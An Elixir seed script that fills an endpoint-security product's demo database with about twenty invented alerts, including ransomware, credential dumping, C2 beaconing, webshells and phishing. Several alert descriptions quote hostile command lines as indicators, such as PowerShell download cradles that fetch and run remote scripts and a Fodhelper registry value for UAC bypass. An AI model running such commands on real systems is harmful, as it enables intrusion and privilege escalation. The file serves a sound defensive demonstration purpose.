# Sample Alerts for Demonstration
# Run with: mix run priv/repo/seeds/sample_alerts.exs
#
# Realistic security alerts representing various attack scenarios
# encountered in enterprise environments.

alias TamanduaServer.Repo
alias TamanduaServer.Alerts.Alert
alias TamanduaServer.Accounts.Organization
alias TamanduaServer.Agents.Agent

IO.puts("Seeding sample security alerts...")

# Get or create demo organization
org = case Repo.get_by(Organization, slug: "tamandua-demo") do
  nil ->
    %Organization{}
    |> Organization.changeset(%{name: "Tamandua Demo Organization", slug: "tamandua-demo"})
    |> Repo.insert!()
  existing -> existing
end

IO.puts("Using organization: #{org.name}")

# Get existing agents or create sample ones if none exist
agents = Repo.all(Agent)
|> Enum.filter(fn a -> a.organization_id == org.id end)

agents = if length(agents) == 0 do
  IO.puts("No agents found, creating sample agents first...")
  # This will be populated by sample_agents.exs, but we'll create a few for alerts
  sample_agent_data = [
    %{hostname: "DESKTOP-SEC01", os_type: "windows", os_version: "Windows 11 Pro", agent_version: "1.0.0", machine_id: :crypto.strong_rand_bytes(16), status: "online", organization_id: org.id, tags: ["workstation", "finance"]},
    %{hostname: "SRV-DC01", os_type: "windows", os_version: "Windows Server 2022", agent_version: "1.0.0", machine_id: :crypto.strong_rand_bytes(16), status: "online", organization_id: org.id, tags: ["server", "domain-controller"]},
    %{hostname: "web-prod-01", os_type: "linux", os_version: "Ubuntu 22.04 LTS", agent_version: "1.0.0", machine_id: :crypto.strong_rand_bytes(16), status: "online", organization_id: org.id, tags: ["server", "web", "production"]}
  ]

  for agent_attrs <- sample_agent_data do
    %Agent{}
    |> Agent.changeset(agent_attrs)
    |> Repo.insert!()
  end

  Repo.all(Agent) |> Enum.filter(fn a -> a.organization_id == org.id end)
else
  agents
end

IO.puts("Using #{length(agents)} agents for alert generation")

# Helper to get random agent
random_agent = fn ->
  Enum.random(agents)
end

# Generate timestamps over the past 7 days
generate_timestamp = fn days_ago, hours_ago ->
  DateTime.utc_now()
  |> DateTime.add(-days_ago * 24 * 60 * 60, :second)
  |> DateTime.add(-hours_ago * 60 * 60, :second)
  |> DateTime.truncate(:second)
end

sample_alerts = [
  # ============================================================================
  # CRITICAL ALERTS
  # ============================================================================

  %{
    title: "Ransomware Activity Detected - LockBit 3.0",
    description: """
    CRITICAL: LockBit 3.0 ransomware activity detected on host DESKTOP-SEC01.
    Multiple files are being encrypted with .lockbit extension.

    Detection Details:
    - Process: C:\\Users\\jsmith\\AppData\\Local\\Temp\\svchost.exe (masqueraded)
    - PID: 4892
    - Parent Process: powershell.exe (PID: 3456)
    - Files Encrypted: 847 files in 12 minutes
    - Encryption Pattern: AES-256 + RSA-2048

    Initial Infection Vector: Phishing email with malicious macro
    First Seen: 2024-01-15 14:32:18 UTC

    Immediate Actions Taken:
    - Host isolated from network
    - Process terminated
    - Forensic snapshot captured

    Recommended Actions:
    1. Investigate lateral movement
    2. Check backup integrity
    3. Scan all endpoints for IOCs
    4. Engage incident response team
    """,
    severity: "critical",
    status: "investigating",
    mitre_tactics: ["impact", "defense-evasion"],
    mitre_techniques: ["T1486", "T1027", "T1036"],
    organization_id: org.id,
    agent_id: Enum.at(agents, 0).id,
    inserted_at: generate_timestamp.(0, 2)
  },

  %{
    title: "LSASS Memory Access - Credential Dumping Attempt",
    description: """
    CRITICAL: Mimikatz-style credential dumping detected on domain controller SRV-DC01.

    Detection Details:
    - Source Process: C:\\Windows\\Temp\\debug64.exe
    - Target Process: lsass.exe (PID: 672)
    - Access Rights: 0x1010 (PROCESS_QUERY_INFORMATION | PROCESS_VM_READ)
    - Sigma Rule: LSASS Memory Access via Mimikatz

    Process Chain:
    cmd.exe -> powershell.exe -> debug64.exe -> lsass.exe

    Extracted Command Line:
    powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/m.ps1')"

    Network IOCs:
    - C2 IP: 192.168.1.100 (internal - compromised host)
    - Download URL: http://192.168.1.100/m.ps1

    CRITICAL: Domain controller compromise may expose all domain credentials.
    """,
    severity: "critical",
    status: "new",
    mitre_tactics: ["credential-access"],
    mitre_techniques: ["T1003.001", "T1059.001"],
    organization_id: org.id,
    agent_id: Enum.at(agents, 1).id,
    inserted_at: generate_timestamp.(0, 1)
  },

  %{
    title: "Active Command & Control Communication Detected",
    description: """
    CRITICAL: Cobalt Strike beacon activity detected communicating with known C2 infrastructure.

    Detection Details:
    - Process: rundll32.exe
    - PID: 5678
    - C2 Server: 185.220.101.45:443
    - Beacon Interval: 60 seconds with 20% jitter
    - Communication: HTTPS (TLS 1.2)

    Network Behavior:
    - Regular HTTPS POST requests to /api/v1/updates
    - Encrypted payload size: 256-1024 bytes
    - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64)

    Threat Intelligence:
    - IP 185.220.101.45 flagged as Cobalt Strike Team Server
    - First seen in wild: 2024-01-10
    - Associated campaigns: FIN7, Conti affiliates

    Lateral Movement Indicators:
    - SMB connections to 5 internal hosts
    - PsExec service created on 2 hosts
    """,
    severity: "critical",
    status: "investigating",
    mitre_tactics: ["command-and-control", "lateral-movement"],
    mitre_techniques: ["T1071.001", "T1573", "T1021.002"],
    organization_id: org.id,
    agent_id: random_agent.().id,
    inserted_at: generate_timestamp.(0, 4)
  },

  # ============================================================================
  # HIGH SEVERITY ALERTS
  # ============================================================================

  %{
    title: "PowerShell Download Cradle Execution",
    description: """
    HIGH: Suspicious PowerShell download cradle detected executing remote content.

    Detection Details:
    - Process: powershell.exe
    - PID: 7234
    - User: CORP\\awhite
    - Command Line: powershell.exe -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/abc123')"

    Execution Context:
    - Parent Process: OUTLOOK.EXE
    - Initial Vector: Email attachment (Invoice_2024.xlsm)
    - Macro Execution: Yes

    Network Activity:
    - Connected to: pastebin.com (104.20.3.29)
    - Downloaded: 15,432 bytes
    - Content Type: text/plain (obfuscated PowerShell)

    Second Stage Payload:
    - Attempted connection to: cdn-update.workers.dev
    - Blocked by network policy

    User Risk Assessment:
    - User has finance role
    - Access to sensitive financial data
    """,
    severity: "high",
    status: "new",
    mitre_tactics: ["execution", "initial-access"],
    mitre_techniques: ["T1059.001", "T1105", "T1566.001"],
    organization_id: org.id,
    agent_id: random_agent.().id,
    inserted_at: generate_timestamp.(0, 6)
  },

  %{
    title: "Suspicious Scheduled Task Created for Persistence",
    description: """
    HIGH: Potentially malicious scheduled task created from suspicious location.

    Detection Details:
    - Task Name: WindowsUpdate
    - Task Path: \\Microsoft\\Windows\\WindowsUpdate\\Automatic
    - Action: C:\\Users\\Public\\update.exe -silent
    - Trigger: At logon, every 4 hours
    - Created By: SYSTEM (via schtasks.exe)

    Process Chain:
    wscript.exe -> cmd.exe -> schtasks.exe /create ...

    Suspicious Indicators:
    - Executable in Users\\Public folder
    - Generic Windows Update name (masquerading)
    - Runs at system startup
    - No digital signature

    File Analysis (update.exe):
    - SHA256: 5c6a1f2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f
    - File Size: 234,567 bytes
    - Packer: UPX
    - VirusTotal: 42/70 detections
    """,
    severity: "high",
    status: "new",
    mitre_tactics: ["persistence", "execution"],
    mitre_techniques: ["T1053.005", "T1036"],
    organization_id: org.id,
    agent_id: random_agent.().id,
    inserted_at: generate_timestamp.(1, 3)
  },

  %{
    title: "Lateral Movement via PsExec Detected",
    description: """
    HIGH: PsExec lateral movement detected between internal hosts.

    Detection Details:
    - Source Host: DESKTOP-SEC01 (192.168.10.45)
    - Target Host: SRV-FILE01 (192.168.10.20)
    - Service Name: PSEXESVC
    - User Context: CORP\\adminuser

    Timeline:
    1. 14:32:15 - SMB connection from DESKTOP-SEC01 to SRV-FILE01
    2. 14:32:16 - PSEXESVC service created on SRV-FILE01
    3. 14:32:17 - Service started, cmd.exe spawned
    4. 14:32:18 - Reconnaissance commands executed

    Commands Executed on Target:
    - whoami /all
    - net user /domain
    - net group "Domain Admins" /domain
    - dir \\\\DC01\\SYSVOL

    Risk Assessment:
    - Source user (adminuser) has domain admin privileges
    - Target is file server with sensitive data
    - Behavior is anomalous for this user
    """,
    severity: "high",
    status: "investigating",
    mitre_tactics: ["lateral-movement", "discovery"],
    mitre_techniques: ["T1021.002", "T1570", "T1087.002"],
    organization_id: org.id,
    agent_id: Enum.at(agents, 0).id,
    inserted_at: generate_timestamp.(1, 8)
  },

  %{
    title: "Kerberoasting Attack Detected",
    description: """
    HIGH: Kerberoasting attack detected - mass service ticket requests.

    Detection Details:
    - Source User: CORP\\jdoe
    - Source Host: DESKTOP-HR03
    - Tickets Requested: 47 service tickets in 2 minutes
    - Encryption Type: RC4 (vulnerable)

    Targeted Service Accounts:
    - svc_sql (SQL Server service)
    - svc_backup (Backup service)
    - svc_web (IIS service)
    - svc_exchange (Exchange service)
    - [43 more service accounts...]

    Attack Pattern:
    - Bulk TGS-REQ requests for SPNs
    - All requests use RC4 encryption
    - Consistent with Rubeus/Impacket tools

    Domain Event IDs:
    - 4769 (Kerberos Service Ticket Request) x 47
    - All from same source IP: 192.168.10.78

    Recommendations:
    1. Reset passwords for targeted service accounts
    2. Investigate source host for compromise
    3. Enable AES-only encryption for service accounts
    """,
    severity: "high",
    status: "new",
    mitre_tactics: ["credential-access"],
    mitre_techniques: ["T1558.003"],
    organization_id: org.id,
    agent_id: random_agent.().id,
    inserted_at: generate_timestamp.(2, 5)
  },

  %{
    title: "Webshell Detected on Web Server",
    description: """
    HIGH: Suspected webshell uploaded to production web server.

    Detection Details:
    - File Path: /var/www/html/wp-content/uploads/2024/01/shell.php
    - File Hash (SHA256): c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0
    - File Size: 1,247 bytes
    - Detection: China Chopper webshell signature

    Upload Context:
    - Uploaded via: WordPress Media Upload vulnerability
    - Source IP: 45.77.123.89 (Vietnam)
    - User-Agent: python-requests/2.28.0

    Webshell Capabilities:
    - Command execution
    - File browser
    - Database access
    - Reverse shell

    Post-Upload Activity:
    - 3 command execution requests detected
    - Commands: id, cat /etc/passwd, ls -la /
    - Exfil attempt to: 45.77.123.90:8080
    """,
    severity: "high",
    status: "investigating",
    mitre_tactics: ["persistence", "initial-access"],
    mitre_techniques: ["T1505.003", "T1190"],
    organization_id: org.id,
    agent_id: Enum.at(agents, 2).id,
    inserted_at: generate_timestamp.(2, 12)
  },

  # ============================================================================
  # MEDIUM SEVERITY ALERTS
  # ============================================================================

  %{
    title: "Suspicious DNS Query Pattern - Potential DGA",
    description: """
    MEDIUM: Domain Generation Algorithm (DGA) activity suspected.

    Detection Details:
    - Source Host: DESKTOP-MKT05
    - Total Queries: 234 unique domains in 5 minutes
    - Query Pattern: Random alphanumeric subdomains
    - Average Domain Length: 32 characters

    Sample Domains:
    - a7b8c9d0e1f2a3b4.malware-domain.com
    - x9y8z7w6v5u4t3s2.malware-domain.com
    - m1n2o3p4q5r6s7t8.malware-domain.com

    DNS Analysis:
    - All queries resolve to same IP: 185.143.223.47
    - TTL: 300 seconds
    - Entropy Score: 0.89 (high randomness)

    Process Association:
    - Process: explorer.exe (suspicious DLL injection)
    - Injected Module: ntuser.dll (not Microsoft signed)

    Threat Assessment:
    - Possible Botnet C2 communication
    - Similar to Necurs/Locky DGA patterns
    """,
    severity: "medium",
    status: "new",
    mitre_tactics: ["command-and-control"],
    mitre_techniques: ["T1568.002", "T1071.004"],
    organization_id: org.id,
    agent_id: random_agent.().id,
    inserted_at: generate_timestamp.(3, 2)
  },

  %{
    title: "Unauthorized Remote Access Tool Detected",
    description: """
    MEDIUM: Unauthorized remote access software detected on endpoint.

    Detection Details:
    - Application: AnyDesk
    - Version: 7.1.13
    - Installation Path: C:\\Users\\bsmith\\AppData\\Roaming\\AnyDesk
    - Process: AnyDesk.exe (PID: 8901)

    Installation Context:
    - Installed By: CORP\\bsmith (standard user)
    - Installation Time: 2024-01-12 09:45:23 UTC
    - Downloaded From: anydesk.com (legitimate)

    Network Activity:
    - Connected to: relay-eu.net.anydesk.com
    - Active Session: Yes
    - Remote ID: 123456789

    Policy Violation:
    - Remote access tools not approved for standard users
    - No IT ticket for software installation
    - User is in HR department

    Risk Assessment:
    - Could be used for unauthorized access
    - Data exfiltration risk
    - Policy violation confirmed
    """,
    severity: "medium",
    status: "new",
    mitre_tactics: ["command-and-control"],
    mitre_techniques: ["T1219"],
    organization_id: org.id,
    agent_id: random_agent.().id,
    inserted_at: generate_timestamp.(3, 7)
  },

  %{
    title: "UAC Bypass Attempt via Fodhelper",
    description: """
    MEDIUM: User Account Control bypass attempt detected using Fodhelper technique.

    Detection Details:
    - Technique: Fodhelper UAC Bypass
    - Process: fodhelper.exe
    - Child Process: cmd.exe (elevated)
    - User: CORP\\mgarcia

    Registry Modification:
    - Key: HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command
    - Value: cmd.exe /c powershell.exe -ep bypass -file C:\\temp\\payload.ps1
    - DelegateExecute: (empty)

    Execution Chain:
    1. Registry key created
    2. fodhelper.exe launched
    3. cmd.exe spawned with high integrity
    4. PowerShell script executed

    Context:
    - User is standard user without admin rights
    - Attempted privilege escalation
    - Blocked by Tamandua's real-time protection
    """,
    severity: "medium",
    status: "resolved",
    mitre_tactics: ["privilege-escalation", "defense-evasion"],
    mitre_techniques: ["T1548.002"],
    resolution_notes: "Blocked by endpoint protection. User machine isolated for investigation.",
    organization_id: org.id,
    agent_id: random_agent.().id,
    inserted_at: generate_timestamp.(4, 4)
  },

  %{
    title: "Suspicious Browser Extension Installed",
    description: """
    MEDIUM: Potentially malicious browser extension detected.

    Detection Details:
    - Browser: Google Chrome
    - Extension Name: PDF Document Helper
    - Extension ID: abcdefghijklmnop123456
    - Version: 1.0.0
    - Source: Sideloaded (not from Chrome Web Store)

    Extension Permissions:
    - Read and change all your data on all websites
    - Access browser tabs
    - Read browser history
    - Modify network requests

    Behavioral Analysis:
    - Injects JavaScript into banking websites
    - Sends form data to: collect.tracking-cdn.com
    - Modifies page content on login forms

    Affected User: CORP\\lthompson
    Installation Time: 2024-01-10 11:23:45 UTC
    """,
    severity: "medium",
    status: "new",
    mitre_tactics: ["collection", "credential-access"],
    mitre_techniques: ["T1185", "T1056.004"],
    organization_id: org.id,
    agent_id: random_agent.().id,
    inserted_at: generate_timestamp.(4, 9)
  },

  %{
    title: "Cryptominer Process Detected",
    description: """
    MEDIUM: Cryptocurrency mining software detected on workstation.

    Detection Details:
    - Process: svchost32.exe (masqueraded)
    - Actual Binary: XMRig 6.18.0
    - PID: 5432
    - CPU Usage: 85%
    - Mining Pool: pool.supportxmr.com:3333

    File Information:
    - Path: C:\\ProgramData\\Microsoft\\svchost32.exe
    - SHA256: f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7
    - File Size: 5,234,567 bytes
    - Signed: No

    Mining Configuration:
    - Algorithm: RandomX (Monero)
    - Wallet: 4...redacted...f
    - Worker Name: infected-pc-01

    Infection Vector:
    - Likely bundled with pirated software
    - Persistence via scheduled task

    Impact:
    - System performance degradation
    - Increased electricity costs
    - Possible unauthorized software installation
    """,
    severity: "medium",
    status: "resolved",
    mitre_tactics: ["impact"],
    mitre_techniques: ["T1496"],
    resolution_notes: "Process terminated, file quarantined, persistence removed.",
    organization_id: org.id,
    agent_id: random_agent.().id,
    inserted_at: generate_timestamp.(5, 2)
  },

  # ============================================================================
  # LOW SEVERITY ALERTS
  # ============================================================================

  %{
    title: "Reconnaissance Commands Executed",
    description: """
    LOW: System enumeration commands detected on endpoint.

    Detection Details:
    - Host: DESKTOP-IT01
    - User: CORP\\itadmin
    - Session Type: Interactive Logon

    Commands Executed:
    - systeminfo
    - net user /domain
    - net group "Domain Admins" /domain
    - ipconfig /all
    - arp -a

    Context Analysis:
    - User is IT administrator
    - Commands executed from cmd.exe
    - No suspicious parent process
    - Part of routine admin activity

    Risk Assessment:
    - Commands match legitimate IT troubleshooting
    - User has appropriate permissions
    - No associated malicious indicators

    Note: Alert generated for audit purposes.
    """,
    severity: "low",
    status: "resolved",
    mitre_tactics: ["discovery"],
    mitre_techniques: ["T1082", "T1087.002", "T1016"],
    resolution_notes: "Verified as legitimate IT administration activity.",
    organization_id: org.id,
    agent_id: random_agent.().id,
    inserted_at: generate_timestamp.(5, 8)
  },

  %{
    title: "Suspicious Outbound Connection to Rare Port",
    description: """
    LOW: Outbound connection detected to uncommon destination port.

    Detection Details:
    - Source Host: DESKTOP-DEV02
    - Source Process: python.exe
    - Destination IP: 203.0.113.42
    - Destination Port: 8888
    - Protocol: TCP

    Connection Context:
    - User: CORP\\developer1
    - Working Directory: C:\\Projects\\WebApp
    - Command Line: python.exe manage.py runserver 0.0.0.0:8888

    Investigation Findings:
    - Developer running Django development server
    - Connecting to test environment
    - IP is internal staging server

    Risk Assessment: Low
    - Legitimate development activity
    - Port 8888 commonly used for web development
    """,
    severity: "low",
    status: "false_positive",
    mitre_tactics: ["command-and-control"],
    mitre_techniques: ["T1571"],
    resolution_notes: "False positive - legitimate development activity.",
    organization_id: org.id,
    agent_id: random_agent.().id,
    inserted_at: generate_timestamp.(6, 3)
  },

  %{
    title: "Software Installation from Downloads Folder",
    description: """
    LOW: Software installed from user Downloads folder.

    Detection Details:
    - Executable: C:\\Users\\rjohnson\\Downloads\\7z2301-x64.exe
    - Product: 7-Zip 23.01 (x64)
    - Publisher: Igor Pavlov
    - Digital Signature: Valid
    - VirusTotal: 0/70 detections

    Installation Context:
    - User: CORP\\rjohnson
    - Installation Time: 2024-01-08 15:34:12 UTC
    - Admin Rights: Used (UAC prompt accepted)

    Policy Note:
    - User installed software outside of approved process
    - Should use Company Portal for software requests

    Risk Assessment: Low
    - Software is legitimate utility
    - Digitally signed by known publisher
    - No malicious behavior detected
    """,
    severity: "low",
    status: "resolved",
    mitre_tactics: ["execution"],
    mitre_techniques: ["T1204.002"],
    resolution_notes: "Legitimate software. User reminded to use approved software portal.",
    organization_id: org.id,
    agent_id: random_agent.().id,
    inserted_at: generate_timestamp.(6, 10)
  },

  %{
    title: "TOR Exit Node Connection Detected",
    description: """
    LOW: Outbound connection to known TOR exit node detected.

    Detection Details:
    - Source Host: DESKTOP-MKT01
    - Destination IP: 185.220.100.252
    - Destination Port: 443
    - Process: chrome.exe
    - User: CORP\\marketing1

    Network Context:
    - TOR Exit Node: Yes (verified)
    - Connection Duration: 45 seconds
    - Data Transferred: 12 KB

    User Activity:
    - User was browsing news website
    - Website CDN routes through TOR-adjacent infrastructure
    - No TOR browser installed on endpoint

    Risk Assessment: Low
    - Likely coincidental routing through TOR infrastructure
    - No TOR usage on endpoint
    - Single short connection
    """,
    severity: "low",
    status: "false_positive",
    mitre_tactics: ["command-and-control"],
    mitre_techniques: ["T1090.003"],
    resolution_notes: "False positive - legitimate web traffic routed through TOR-adjacent CDN.",
    organization_id: org.id,
    agent_id: random_agent.().id,
    inserted_at: generate_timestamp.(7, 1)
  },

  # ============================================================================
  # ADDITIONAL REALISTIC ALERTS
  # ============================================================================

  %{
    title: "Phishing Email with Malicious Attachment Blocked",
    description: """
    MEDIUM: Phishing email with malicious macro-enabled document blocked.

    Email Details:
    - Subject: Urgent: Invoice #INV-2024-0892 Requires Immediate Payment
    - From: accounting@micr0soft-billing.com (spoofed)
    - To: accounts.payable@company.com
    - Attachment: Invoice_Jan2024.xlsm

    Attachment Analysis:
    - File Type: Excel Macro-Enabled Workbook
    - SHA256: 7a0f0f4d2c5e6b3a8f1c2d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a
    - Macro Content: Auto_Open with PowerShell download
    - Download URL: https://malware-cdn.com/payload.exe

    Detection:
    - Blocked by email gateway
    - Attachment quarantined
    - User notified

    Similar Emails: 12 blocked in last 24 hours
    Campaign: Business Email Compromise targeting Finance
    """,
    severity: "medium",
    status: "resolved",
    mitre_tactics: ["initial-access"],
    mitre_techniques: ["T1566.001", "T1204.002"],
    resolution_notes: "Email blocked at gateway. Phishing campaign IOCs added to blocklist.",
    organization_id: org.id,
    agent_id: random_agent.().id,
    inserted_at: generate_timestamp.(1, 6)
  },

  %{
    title: "Potential Data Exfiltration via Cloud Storage",
    description: """
    HIGH: Large data upload to personal cloud storage detected.

    Detection Details:
    - User: CORP\\sthomas
    - Destination: drive.google.com
    - Data Volume: 2.3 GB
    - File Count: 847 files
    - Duration: 23 minutes

    Uploaded Content Analysis:
    - File Types: .xlsx, .docx, .pdf, .pptx
    - Folder Source: \\\\FILESERVER\\Finance\\Q4_Reports
    - Contains: Financial reports, customer data

    User Context:
    - Department: Finance
    - Recent Activity: Submitted resignation 3 days ago
    - Access Level: Sensitive financial data

    Data Classification:
    - PII: Yes (customer names, addresses)
    - Financial: Yes (revenue reports)
    - Confidential: Yes

    Risk Assessment: HIGH
    - Departing employee
    - Large volume of sensitive data
    - Personal cloud storage destination
    """,
    severity: "high",
    status: "investigating",
    mitre_tactics: ["exfiltration", "collection"],
    mitre_techniques: ["T1567.002", "T1005"],
    organization_id: org.id,
    agent_id: random_agent.().id,
    inserted_at: generate_timestamp.(0, 8)
  },

  %{
    title: "Brute Force Attack Against RDP",
    description: """
    MEDIUM: Brute force authentication attempts against RDP service.

    Detection Details:
    - Target Host: SRV-TERM01 (Terminal Server)
    - Target Service: RDP (3389/TCP)
    - Source IPs: 23 unique addresses
    - Failed Attempts: 4,892 in 1 hour
    - Targeted Accounts: Administrator, admin, root, guest

    Top Source IPs:
    1. 185.156.73.42 (Russia) - 1,245 attempts
    2. 45.227.254.89 (Brazil) - 987 attempts
    3. 103.75.201.45 (Vietnam) - 654 attempts

    Attack Pattern:
    - Credential stuffing (username:password lists)
    - Dictionary attack against admin accounts
    - Consistent with known botnet behavior

    Mitigation Applied:
    - Source IPs blocked at firewall
    - Account lockout triggered for Administrator
    - RDP access restricted to VPN only
    """,
    severity: "medium",
    status: "resolved",
    mitre_tactics: ["credential-access", "initial-access"],
    mitre_techniques: ["T1110.001", "T1110.003"],
    resolution_notes: "Attack blocked. RDP restricted to VPN access only. Source IPs added to perimeter blocklist.",
    organization_id: org.id,
    agent_id: Enum.at(agents, 1).id,
    inserted_at: generate_timestamp.(2, 4)
  }
]

# Insert alerts
for alert_attrs <- sample_alerts do
  alert_with_timestamps = Map.merge(alert_attrs, %{
    updated_at: alert_attrs[:inserted_at] || DateTime.utc_now()
  })

  changeset = Alert.changeset(%Alert{}, alert_with_timestamps)

  case Repo.insert(changeset) do
    {:ok, alert} ->
      IO.puts("  Created alert: [#{alert.severity}] #{String.slice(alert.title, 0, 60)}...")
    {:error, changeset} ->
      IO.puts("  Failed to create alert: #{inspect(changeset.errors)}")
  end
end

# Summary
IO.puts("\n" <> String.duplicate("=", 71))
IO.puts("Sample Alerts Summary")
IO.puts("=" <> String.duplicate("=", 70))

by_severity = Enum.group_by(sample_alerts, & &1.severity)
for severity <- ["critical", "high", "medium", "low"] do
  count = length(Map.get(by_severity, severity, []))
  IO.puts("  #{String.upcase(severity)}: #{count} alerts")
end

by_status = Enum.group_by(sample_alerts, & &1.status)
IO.puts("\nBy Status:")
for {status, alerts} <- by_status do
  IO.puts("  #{status}: #{length(alerts)}")
end

IO.puts("\nTotal alerts seeded: #{length(sample_alerts)}")
IO.puts("Sample alerts seeding complete!")
